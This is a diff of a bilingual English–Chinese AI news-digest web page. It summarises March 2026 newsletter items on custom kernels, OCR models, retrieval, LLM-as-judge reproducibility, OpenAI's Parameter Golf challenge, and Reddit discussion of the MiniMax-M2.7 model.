+<div style="color:#9a9ea6;font-size:14px;line-height:1.7;margin:20px 0 6px;">Custom kernel packaging is getting easier: ariG23498 highlighted <strong style="color:#2471a3;background:#eaf4fd;padding:1px 4px;border-radius:3px;">Hugging Face</strong>'s new <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">kernels</strong> library, which aims to make custom kernels more shareable and easier to integrate via the Hub. The pitch is straightforward: lower the pain of writing and distributing fused/custom kernels without requiring every model团队 to hand-roll installation and integration logic.</div>
+<p style="color:#2c2c2e;margin:4px 0 24px;line-height:1.8;font-size:15px;">自定义内核打包正变得更容易：ariG23498 强调了 <strong style="color:#2471a3;background:#eaf4fd;padding:1px 4px;border-radius:3px;">Hugging Face</strong> 的新 <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">kernels</strong> 库，旨在通过 Hub 使自定义内核更易于分享和集成。其卖点很简单：降低编写和分发融合/自定义内核的痛苦，无需每个模型团队都手动编写安装和集成逻辑。</p>
+
+<div style="color:#9a9ea6;font-size:14px;line-height:1.7;margin:20px 0 6px;">Inference optimization remains a first-class topic: The same thread on kernels reiterates the familiar optimization stack—close idle gaps between kernel launches, fuse ops with <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">torch.compile</strong>, and only fall back to custom kernels where needed. On the hardware side, <strong style="color:#2471a3;background:#eaf4fd;padding:1px 4px;border-radius:3px;">Stas Bekman</strong> noted that <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">NVLink</strong>'s marketed bandwidth can be misleading because it is not duplex in the way many assume.</div>
+<p style="color:#2c2c2e;margin:4px 0 24px;line-height:1.8;font-size:15px;">推理优化仍然是一等话题：关于内核的同一讨论重申了熟悉的优化技术栈——消除内核启动之间的空闲间隙，使用 <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">torch.compile</strong> 融合算子（fuse ops），仅在需要时才回退到自定义内核。在硬件方面，<strong style="color:#2471a3;background:#eaf4fd;padding:1px 4px;border-radius:3px;">Stas Bekman</a> 指出，<strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">NVLink</strong> 的市场宣传带宽可能具有误导性，因为它并非许多人假设的那样是双工的。</p>
+
+<div style="color:#9a9ea6;font-size:14px;line-height:1.7;margin:20px 0 6px;">Compute bottlenecks are still upstream of everything else: kimmonismus argues that <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">ASML EUV machines</strong> and their narrow supply chains may cap production at roughly 100 machines/year by 2030, making lithography an important ceiling on AI scaling over this decade.</div>
+<p style="color:#2c2c2e;margin:4px 0 24px;line-height:1.8;font-size:15px;">计算瓶颈仍然是其他一切的上游限制：kimmonismus 认为，<strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">ASML EUV 光刻机</strong>及其狭窄的供应链可能在 2030 年前将产量限制在每年约 100 台，使得光刻技术成为这十年 AI 扩展的一个重要天花板。</p>
+
+<h4 style="margin:24px 0 12px;">Documents, OCR, retrieval, and context engineering for real workflows</h4>
+
+<div style="color:#9a9ea6;font-size:14px;line-height:1.7;margin:20px 0 6px;">Document AI is trending toward end-to-end multimodal parsers with grounding: <strong style="color:#2471a3;background:#eaf4fd;padding:1px 4px;border-radius:3px;">Baidu</strong> introduced <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">Qianfan-OCR</strong>, a 4B end-to-end document intelligence model that collapses table extraction, formula recognition, chart understanding, and KIE (Key Information Extraction) into a single pass. <strong style="color:#2471a3;background:#eaf4fd;padding:1px 4px;border-radius:3px;">Vik Paruchuri</strong> open-sourced <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">Chandra OCR 2</strong>, claiming 85.9% on olmOCR bench, 90+ language support, and stronger layout, handwriting, math, form, and table support in a smaller 4B model. On the platform side, <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">LlamaIndex</strong> and jerryjliu0 emphasized that production document agents need not just markdown conversion but <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">layout detection</strong>, segmentation, metadata context, and <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">visual grounding</strong> to support human-auditable document workflows.</div>
+<p style="color:#2c2c2e;margin:4px 0 24px;line-height:1.8;font-size:15px;">文档 AI 正趋向于具备定位（grounding）能力的端到端多模态解析器：<strong style="color:#2471a3;background:#eaf4fd;padding:1px 4px;border-radius:3px;">百度（Baidu）</strong>推出了 <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">Qianfan-OCR</strong>，一个 40 亿参数的端到端文档智能模型，将表格提取、公式识别、图表理解和 KIE（关键信息提取）合并为单次处理。<strong style="color:#2471a3;background:#eaf4fd;padding:1px 4px;border-radius:3px;">Vik Paruchuri</strong> 开源了 <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">Chandra OCR 2</strong>，声称在 olmOCR 基准上达到 85.9%，支持 90 多种语言，并在更小的 40 亿参数模型中提供更强大的版面、手写、数学、表单和表格支持。在平台方面，<strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">LlamaIndex</strong> 和 jerryjliu0 强调，生产级文档智能体不仅需要 Markdown 转换，还需要<strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">版面检测</strong>（layout detection）、分割、元数据上下文和<strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">视觉定位</strong>（visual grounding），以支持人类可审计的文档工作流程。</p>
+
+<div style="color:#9a9ea6;font-size:14px;line-height:1.7;margin:20px 0 6px;">Late-interaction retrieval continues to push on the memory/quality tradeoff: victorialslocum summarized <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">MUVERA</strong>, which compresses multi-vector retrieval into fixed-dimensional encodings, reporting about <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">70% memory reduction</strong> and much smaller HNSW graphs at some recall/query-throughput cost. lateinteraction used the thread to reiterate the limitations of single-vector retrieval on harder OOD settings.</div>
+<p style="color:#2c2c2e;margin:4px 0 24px;line-height:1.8;font-size:15px;">延迟交互检索（Late-interaction retrieval）持续推动内存/质量权衡：victorialslocum 总结了 <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">MUVERA</strong>，该技术将多向量检索压缩为固定维度编码，报告约 <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">70% 的内存减少</strong>和更小的 HNSW（Hierarchical Navigable Small World）图，代价是一定的召回率/查询吞吐量。lateinteraction 使用该讨论重申了单向量检索在更难的分发外（OOD，Out-of-Distribution）设置中的局限性。</p>
+
+<div style="color:#9a9ea6;font-size:14px;line-height:1.7;margin:20px 0 6px;"><strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">Context engineering</strong> is becoming a product category: llama_index explicitly frames context engineering as the successor to prompt engineering, with structured parsing/extraction as a core lever. This pairs with Hugging Face's new support for serving <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">Markdown paper views to agents</strong> and a <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">Paper Pages skill</strong> for searching and reading papers more token-efficiently (Clement Delangue, Niels Rogge, mishig25).</div>
+<p style="color:#2c2c2e;margin:4px 0 24px;line-height:1.8;font-size:15px;"><strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">上下文工程</strong>（Context engineering）正成为一个产品类别：llama_index 明确将上下文工程框定为提示工程（prompt engineering）的继任者，以结构化解析/提取为核心杠杆。这与 Hugging Face 新支持向智能体提供<strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">Markdown 格式论文视图</strong>以及用于更高效搜索和阅读论文的 <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">Paper Pages 技能</strong>（Clement Delangue, Niels Rogge, mishig25）相配套。</p>
+
+<h4 style="margin:24px 0 12px;">Evals, training methodology, and benchmarks worth watching</h4>
+
+<div style="color:#9a9ea6;font-size:14px;line-height:1.7;margin:20px 0 6px;"><strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">LLM-as-judge</strong> reproducibility is under fire again: a1zhang showed a model scoring <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">10%</strong> under GPT-5.2-as-judge vs <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">43.5%</strong> under GPT-5.1-as-judge, despite a paper reporting 34%—a stark reminder that judge choice can swamp conclusions. torchcompiled distilled the takeaway: don't use LLM-as-judge without validating human correlation or tuning for it.</div>
+<p style="color:#2c2c2e;margin:4px 0 24px;line-height:1.8;font-size:15px;"><strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">LLM-as-judge</strong>（以大语言模型作为评判者）的可复现性再次受到质疑：a1zhang 展示了一个模型在 GPT-5.2-as-judge 下得分 <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">10%</strong>，而在 GPT-5.1-as-judge 下得分 <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">43.5%</strong>，尽管某篇论文报告的是 34%——这 stark 地提醒我们，评判者的选择可能淹没结论。torchcompiled 提炼了要点：不要在没有验证与人类相关性或为此调优的情况下使用 LLM-as-judge。</p>
+
+<div style="color:#9a9ea6;font-size:14px;line-height:1.7;margin:20px 0 6px;">Pretraining data composition is re-emerging as a major lever: rosinality highlighted work showing that mixing <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">SFT data during pretraining</strong> can outperform the standard pretrain-then-finetune pipeline, with a scaling law for the ratio under a token budget. Related posts from arimorcos, pratyushmaini, and <strong style="color:#2471a3;background:#eaf4fd;padding:1px 4px;border-radius:3px;">Christina Baek</strong> all argue that domain adaptation often benefits more from earlier data mixing or even repeating small high-quality datasets 10–50x during pretraining than from naive finetuning alone.</div>
+<p style="color:#2c2c2e;margin:4px 0 24px;line-height:1.8;font-size:15px;">预训练数据组成（Pretraining data composition）正重新成为一个重要杠杆：rosinality 强调了研究表明，在预训练期间混合 <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">SFT（Supervised Fine-Tuning，监督微调）数据</strong>可以优于标准的预训练-然后-微调流程，并给出了在 token 预算下的比例缩放定律。来自 arimorcos、pratyushmaini 和 <strong style="color:#2471a3;background:#eaf4fd;padding:1px 4px;border-radius:3px;">Christina Baek</strong> 的相关帖子都认为，领域适应（domain adaptation）往往更多受益于早期的数据混合，甚至在预训练期间将小的高质量数据集重复 10-50 次，而非仅依靠朴素的微调。</p>
+
+<div style="color:#9a9ea6;font-size:14px;line-height:1.7;margin:20px 0 6px;">Benchmarks are shifting toward "unsolved and useful": <strong style="color:#2471a3;background:#eaf4fd;padding:1px 4px;border-radius:3px;">Ofir Press</strong> points to a future where improving on a benchmark means solving previously unsolved tasks that matter in the world, not just memorizing exam-like datasets. He also notes <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">AssistantBench</strong> remains unsolved 1.5 years later. New benchmark/tooling drops include <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">ScreenSpot-Pro on Hugging Face</strong> for GUI agents and Arena's academic partnerships funding eval work.</div>
+<p style="color:#2c2c2e;margin:4px 0 24px;line-height:1.8;font-size:15px;">基准测试（Benchmarks）正转向"未解决且有用"：<strong style="color:#2471a3;background:#eaf4fd;padding:1px 4px;border-radius:3px;">Ofir Press</strong> 指出，未来在基准测试上的改进意味着解决世界上以前未解决的重要任务，而不仅仅是记忆类似考试的数据集。他还指出 <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">AssistantBench</strong> 在 1.5 年后仍未被解决。新的基准测试/工具发布包括 Hugging Face 上用于 GUI 智能体的 <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">ScreenSpot-Pro</strong>，以及 Arena 资助评估工作的学术合作伙伴关系。</p>
+
+<h4 style="margin:24px 0 12px;">Top tweets (by engagement, filtered for technical relevance)</h4>
+
+<div style="color:#9a9ea6;font-size:14px;line-height:1.7;margin:20px 0 6px;"><strong style="color:#2471a3;background:#eaf4fd;padding:1px 4px;border-radius:3px;">OpenAI</strong>'s <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">Parameter Golf</strong> challenge: OpenAI launched Parameter Golf, a training challenge to fit the best LM in a <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">16MB artifact</strong> trained in under 10 minutes on 8×H100s, with <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">$1M in compute</strong> behind it. Good talent-pipeline energy, and a nice complement to the NanoGPT speedrun culture (details via scaling01).</div>
+<p style="color:#2c2c2e;margin:4px 0 24px;line-height:1.8;font-size:15px;"><strong style="color:#2471a3;background:#eaf4fd;padding:1px 4px;border-radius:3px;">OpenAI</strong> 的 <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">Parameter Golf</strong>（参数高尔夫）挑战：OpenAI 发起了 Parameter Golf，一项训练挑战，要求在 8×H100 上 10 分钟内训练出能放入 <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">16MB 工件</strong>的最佳语言模型，背后有 <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">100 万美元的计算资源</strong>支持。这是良好的人才输送管道活动，也是对 NanoGPT 速通文化的很好补充（详情 via scaling01）。</p>
+
+<div style="color:#9a9ea6;font-size:14px;line-height:1.7;margin:20px 0 6px;"><strong style="color:#2471a3;background:#eaf4fd;padding:1px 4px;border-radius:3px;">Anthropic</strong>'s 81k-user study: Anthropic says it used <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">Claude</strong> to interview <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">80,508 people in one week</strong> about hopes and fears around AI—the company calls it the largest qualitative study of its kind (announcement). The research is interesting both as social measurement and as a signal that model-mediated interviewing may become a standing product/research capability.</div>
+<p style="color:#2c2c2e;margin:4px 0 24px;line-height:1.8;font-size:15px;"><strong style="color:#2471a3;background:#eaf4fd;padding:1px 4px;border-radius:3px;">Anthropic</strong> 的 8.1 万用户研究：Anthropic 称其使用 <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">Claude</strong> 在一周内采访了 <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">80,508 人</strong>，了解他们对 AI 的希望和恐惧——该公司称这是同类最大规模的定性研究（公告）。这项研究作为社会测量很有趣，也作为一个信号表明模型介导的采访（model-mediated interviewing）可能成为常备的产品/研究能力。</p>
+
+<div style="color:#9a9ea6;font-size:14px;line-height:1.7;margin:20px 0 6px;"><strong style="color:#2471a3;background:#eaf4fd;padding:1px 4px;border-radius:3px;">Runway</strong>'s real-time video generation preview: Runway shared a research preview developed with <strong style="color:#2471a3;background:#eaf4fd;padding:1px 4px;border-radius:3px;">NVIDIA</strong> showing <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">HD video generation with time-to-first-frame under 100ms</strong> on <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">Vera Rubin</strong> hardware (tweet). If it generalizes, this is a qualitatively different interaction loop for video models.</div>
+<p style="color:#2c2c2e;margin:4px 0 24px;line-height:1.8;font-size:15px;"><strong style="color:#2471a3;background:#eaf4fd;padding:1px 4px;border-radius:3px;">Runway</strong> 的实时视频生成预览：Runway 分享了与 <strong style="color:#2471a3;background:#eaf4fd;padding:1px 4px;border-radius:3px;">NVIDIA</strong> 合作开发的研究预览，展示在 <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">Vera Rubin</strong> 硬件上<strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">首帧时间低于 100 毫秒的高清视频生成</strong>（推文）。如果这能泛化，将为视频模型带来质上不同的交互循环。</p>
+
+<div style="color:#9a9ea6;font-size:14px;line-height:1.7;margin:20px 0 6px;"><strong style="color:#2471a3;background:#eaf4fd;padding:1px 4px;border-radius:3px;">Hugging Face</strong> on agent-facing research interfaces: The platform change to serve Markdown paper views to agents and the companion paper skill is small but important infrastructure for agentic research workflows (Clement Delangue).</div>
+<p style="color:#2c2c2e;margin:4px 0 24px;line-height:1.8;font-size:15px;"><strong style="color:#2471a3;background:#eaf4fd;padding:1px 4px;border-radius:3px;">Hugging Face</strong> 关于面向智能体的研究界面：向智能体提供 Markdown 论文视图的平台变更及配套的论文技能，是智能体研究工作流程（agentic research workflows）的小而重要的基础设施（Clement Delangue）。</p>
+
+<div style="color:#9a9ea6;font-size:14px;line-height:1.7;margin:20px 0 6px;"><strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">VS Code</strong> integrated browser debugging: Microsoft's latest VS Code release adds integrated browser debugging for end-to-end web app workflows—useful in its own right, and likely to matter even more as coding agents are asked to operate against live browser state.</div>
+<p style="color:#2c2c2e;margin:4px 0 24px;line-height:1.8;font-size:15px;"><strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">VS Code</strong> 集成浏览器调试：微软最新的 VS Code 版本增加了端到端 Web 应用工作流的集成浏览器调试——这本身很有用，而且随着编程智能体被要求在实时浏览器状态下操作，它将变得更加重要。</p>
+
+<h3 style="margin:24px 0 12px;">AI Reddit Recap</h3>
+
+<h4 style="margin:24px 0 12px;">/r/LocalLlama + /r/localLLM Recap</h4>
+
+<h4 style="margin:24px 0 12px;">1. MiniMax-M2.7 Model Announcements</h4>
+
+<div style="color:#9a9ea6;font-size:14px;line-height:1.7;margin:20px 0 6px;"><strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">MiniMax-M2.7 Announced!</strong> (Activity: 947): The image presents a comparative analysis of the newly announced MiniMax-M2.7 model against other models like Gemini 3.1 Pro, Sonnet 4.6, Opus 4.6, and GPT 5.4 across various benchmarks such as SWE Bench Pro, VIBE-Pro, and MM-ClawBench. MiniMax-M2.7 is highlighted in red, indicating its performance metrics, which are crucial for understanding its capabilities relative to existing models. The model's autonomous iteration capabilities are emphasized, showcasing its ability to optimize software engineering tasks through iterative cycles, leading to a <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">30% performance improvement</strong> on internal evaluations. This highlights the model's potential for self-evolution and automation in AI development. Commenters express skepticism about the practical usability of models that perform well on benchmarks but may not generalize well to real-world tasks. There is anticipation for user testing to validate the model's effectiveness beyond controlled evaluations.</div>
+<p style="color:#2c2c2e;margin:4px 0 24px;line-height:1.8;font-size:15px;"><strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">MiniMax-M2.7 发布！</strong>（活跃度：947）：该图像展示了新发布的 MiniMax-M2.7 模型与 Gemini 3.1 Pro、Sonnet 4.6、Opus 4.6 和 GPT 5.4 等其他模型在 SWE Bench Pro、VIBE-Pro 和 MM-ClawBench 等各项基准测试中的对比分析。MiniMax-M2.7 以红色突出显示，表明其性能指标，这对于理解其相对于现有模型的能力至关重要。该模型的自主迭代能力得到强调，展示了其通过迭代循环优化软件工程任务的能力，在内部评估中实现了<strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">30% 的性能提升</strong>。这突显了该模型在 AI 开发中自我进化和自动化的潜力。评论者对模型在基准测试中表现良好但可能无法很好地泛化到现实世界任务的实际可用性表示怀疑。人们期待通过用户测试来验证模型在受控评估之外的有效性。</p>
+
+<div style="color:#9a9ea6;font-size:14px;line-height:1.7;margin:20px 0 6px;">Recoil42 highlights the autonomous iteration capabilities of the MiniMax-M2.7 model, which can optimize its own performance through iterative cycles. The model autonomously analyzes failure paths, plans changes, modifies code, and evaluates results, achieving a 30% performance improvement on internal evaluation sets by optimizing sampling parameters and workflow guidelines.</div>
+<p style="color:#2c2c2e;margin:4px 0 24px;line-height:1.8;font-size:15px;">Recoil42 强调了 MiniMax-M2.7 模型的自主迭代能力，该模型可以通过迭代循环优化自身性能。模型自主分析失败路径、规划变更、修改代码并评估结果，通过优化采样参数和工作流程指南，在内部评估集上实现了 30% 的性能提升。</p>
+
+<div style="color:#9a9ea6;font-size:14px;line-height:1.7;margin:20px 0 6px;">Specialist_Sun_7819 raises a critical point about the discrepancy between benchmark performance and real-world usability. They emphasize the importance of user testing to assess how models perform on tasks that deviate from their training distribution, suggesting that many models excel in evaluations but struggle with off-distribution tasks.</div>
+<p style="color:#2c2c2e;margin:4px 0 24px;line-height:1.8;font-size:15px;">Specialist_Sun_7819 提出了一个关于基准测试性能与实际可用性之间差异的关键观点。他们强调用户测试的重要性，以评估模型在偏离其训练分布的任务上的表现，暗示许多模型在评估中表现出色，但在分布外（off-distribution）任务上挣扎。</p>
+
+<div style="color:#9a9ea6;font-size:14px;line-height:1.7;margin:20px 0 6px;">Lowkey_LokiSN expresses concern about the model's <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">quantization</strong> resistance, referencing issues with the previous M2.5 model's UD-Q4_K_XL variant. This highlights the importance of maintaining model performance post-quantization, which can be a challenge for large models when reducing precision for deployment.</div>
+<p style="color:#2c2c2e;margin:4px 0 24px;line-height:1.8;font-size:15px;">Lowkey_LokiSN 表达了对模型<strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">量化</strong>（quantization）抗性的担忧，参考了之前 M2.5 模型 UD-Q4_K_XL 变体的问题。这突显了在量化后保持模型性能的重要性，对于大型模型在降低精度部署时这可能是一个挑战。</p>
+
+<div style="color:#9a9ea6;font-size:14px;line-height:1.7;margin:20px 0 6px;"><strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">MiniMax M2.7 Is On The Way</strong> (Activity: 329): The image is a tweet from MiniMax announcing their participation in the <strong style="color:#2471a3;background:#eaf4fd;padding:1px 4px;border-radius:3px;">NVIDIA GTC</strong> event where they plan to discuss their upcoming model, MiniMax M2.7, along with multimodal systems and AI products. This suggests that MiniMax M2.7 might incorporate multimodal capabilities, potentially handling multiple types of data inputs like text, images, and audio. The mention of multimodal systems aligns with current trends in AI development, where models are increasingly designed to process and integrate various data forms for more comprehensive outputs. A comment highlights the desire for a smaller version of the model, indicating user interest in more accessible or resource-efficient versions. Another comment praises the performance of MiniMax 2.5, noting its speed and tooling capabilities, but points out the lack of image and audio input support, which could be addressed in the upcoming M2.7 model.</div>
+<p style="color:#2c2c2e;margin:4px 0 24px;line-height:1.8;font-size:15px;"><strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">MiniMax M2.7 即将到来</strong>（活跃度：329）：该图是 MiniMax 的一条推文，宣布他们参加 <strong style="color:#2471a3;background:#eaf4fd;padding:1px 4px;border-radius:3px;">NVIDIA GTC</strong> 大会，计划讨论即将推出的模型 MiniMax M2.7，以及多模态系统和 AI 产品。这表明 MiniMax M2.7 可能包含多模态能力，潜在处理文本、图像和音频等多种数据输入。提及多模态系统符合当前 AI 开发趋势，即模型越来越多地被设计为处理和集成各种数据形式以生成更全面的输出。一条评论强调了对更小版本模型的需求，表明用户对更易访问或资源效率更高的版本感兴趣。另一条评论赞扬了 MiniMax 2.5 的性能，指出其速度和工具能力，但指出了缺乏图像和音频输入支持，这可能在下一代 M2.7 模型中得到解决。</p>
+
+<div style="color:#9a9ea6;font-size:14px;line-height:1.7;margin:20px 0 6px;">z_3454_pfk highlights the performance of MiniMax 2.5, noting its efficiency with tooling and <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">retrieval-augmented generation (RAG)</strong>. The model is praised for its speed, though it currently lacks support for image and audio inputs, which could be a limitation for some applications.</div>
+<p style="color:#2c2c2e;margin:4px 0 24px;line-height:1.8;font-size:15px;">z_3454_pfk 强调了 MiniMax 2.5 的性能，指出其在工具和<strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">检索增强生成（RAG）</strong>方面的效率。该模型因其速度而受到称赞，尽管目前缺乏对图像和音频输入的支持，这对某些应用可能是一个限制。</p>
+
+<div style="color:#9a9ea6;font-size:14px;line-height:1.7;margin:20px 0 6px;">Dismal-Effect-1914 emphasizes the compactness and efficiency of MiniMax 2.5, stating it is the best model available that fits under approximately 150 GB when using 4-bit quantization. This suggests a strong balance between performance and resource usage, making it suitable for environments with limited storage capacity.</div>
+<p style="color:#2c2c2e;margin:4px 0 24px;line-height:1.8;font-size:15px;">Dismal-Effect-1914 强调了 MiniMax 2.5 的紧凑性和效率，称其是在使用 4-bit 量化时能在约 150 GB 内容纳的最佳可用模型。这表明在性能和资源使用之间存在良好平衡，使其适合存储容量有限的环境。</p></div>
+      <button class="toggle-btn" onclick="toggleTranslation(this)">展开全文翻译</button>
+      <a class="link" href="https://www.latent.space/p/ainews-minimax-27-glm-5-at-13-cost" target="_blank">阅读原文 &rarr;</a>
     </div>
 
 <div class="article-card">
       <div class="source">TLDR AI</div>
       <div class="title-row">
-        <div class="title">GPT-5.4 mini/nano新模型、Cursor自总结技术与Harmonic AI数学家进展</div>
+        <div class="title">小米与MiniMax新模型、中国OpenClaw热潮、Anthropic 8.1万人研究</div>
         <span class="tone-pill" style="background:#dbeafe;color:#1d4ed8">📊 分析</span>
       </div>
-      <div class="title-en">GPT-5.4 mini &amp; nano ⚡, Cursor self-summarization 📝, Harmonic’s AI mathematician ♾️</div>
-      <div class="tags"><span class="tag">大模型</span><span class="tag">AI编程</span><span class="tag">智能体</span></div>
-      <div class="summary">OpenAI发布轻量级GPT-5.4 mini与nano模型以提升高容量任务效率，Cursor推出模型自总结上下文功能优化长会话编程体验，Harmonic的Aristotle Agent实现24小时无人干预的数学证明；同时Mistral推出企业定制模型平台Forge，微软重组Copilot团队，英伟达恢复对华H200芯片供应。</div>
+      <div class="title-en">Xiaomi &amp; Minimax models 🤖, China’s OpenClaw obsession 🦞, Anthropic 81k study 📊</div>
+      <div class="tags"><span class="tag">大模型</span><span class="tag">智能体</span><span class="tag">中国AI</span><span class="tag">行业应用</span></div>
+      <div class="summary">本期内容聚焦小米与MiniMax发布高性能大模型、中国推动OpenClaw全民普及，以及Anthropic基于8.1万用户的AI需求调研，同时涵盖GPT 5.4、AI代理工具和企业级应用等多项前沿进展。</div>
       <div class="quotes-section">
-<div class="quote-block"><div class="quote-en">Experiments with the autoresearch framework show that environment design and strict validation gates are more critical than model choice for preventing agent drift.</div><div class="quote-zh">自动研究框架的实验表明，在防止智能体偏离目标方面，环境设计和严格的验证门槛比模型选择更为关键。</div></div>
-<div class="quote-block"><div class="quote-en">This shift toward progressive disclosure allows agents to fetch specific data and runbooks only when needed, reducing context noise and error rates.</div><div class="quote-zh">这种向渐进式披露的转变使得智能体仅在需要时才获取特定数据和运行手册，从而减少上下文噪音和错误率。</div></div>
+<div class="quote-block"><div class="quote-en">GPT 5.4 will likely appeal to the master coordinator who wants to unleash an AI army on distributed tasks.</div><div class="quote-zh">GPT 5.4 可能会吸引那些想要释放AI大军处理分布式任务的协调大师。</div></div>
+<div class="quote-block"><div class="quote-en">MiniMax&#x27;s release marks a shift towards models that participate in their own evolution.</div><div class="quote-zh">MiniMax 的发布标志着一个转变：模型开始参与到自身的进化过程中。</div></div>
 </div>
-      <div class="translation"><h3 style="margin:24px 0 12px;">TLDR AI 2026-03-18</h3>
+      <div class="translation"><h3 style="margin:24px 0 12px;">TLDR AI 2026-03-19</h3>
 
-<div style="color:#9a9ea6;font-size:14px;line-height:1.7;margin:20px 0 6px;">
-GPT-5.4 mini & nano ⚡, Cursor self-summarization 📝, Harmonic’s AI mathematician ♾️
-</div>
-<p style="color:#2c2c2e;margin:4px 0 24px;line-height:1.8;font-size:15px;">
-GPT-5.4 mini 与 nano ⚡、<strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">Cursor</strong> 自总结上下文 📝、<strong style="color:#2471a3;background:#eaf4fd;padding:1px 4px;border-radius:3px;">Harmonic</strong> 的 AI 数学家 ♾️
-</p>
+<h3 style="margin:24px 0 12px;">Xiaomi & Minimax models 🤖, China's OpenClaw obsession 🦞, Anthropic 81k study 📊</h3>
 
-<h3 style="margin:24px 0 12px;">Mistral Unveiled Forge (6 minute read)</h3>
 
-<div style="color:#9a9ea6;font-size:14px;line-height:1.7;margin:20px 0 6px;">
-Mistral Forge is a platform for enterprises and governments to build custom AI models trained from scratch on their own data. The company positions it as a more controlled alternative to fine-tuning and RAG, with support for domain-specific training, reinforcement learning, and reduced dependence on third-party model providers.
-</div>
-<p style="color:#2c2c2e;margin:4px 0 24px;line-height:1.8;font-size:15px;">
-<strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">Mistral Forge</strong> 是一个面向企业和政府的平台，用于基于自有数据从头开始训练定制 AI 模型。该公司将其定位为比微调（fine-tuning）和 <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">RAG</strong>（检索增强生成）更可控的替代方案，支持领域特定训练、强化学习，并减少对第三方模型提供商的依赖。
-</p>
 
-<h3 style="margin:24px 0 12px;">Aristotle Agent (1 minute read)</h3>
+<h4 style="margin:24px 0 12px;">MiniMax launches M2.7 model on MiniMax Agent and APIs (1 minute read)</h4>
 
-<div style="color:#9a9ea6;font-size:14px;line-height:1.7;margin:20px 0 6px;">
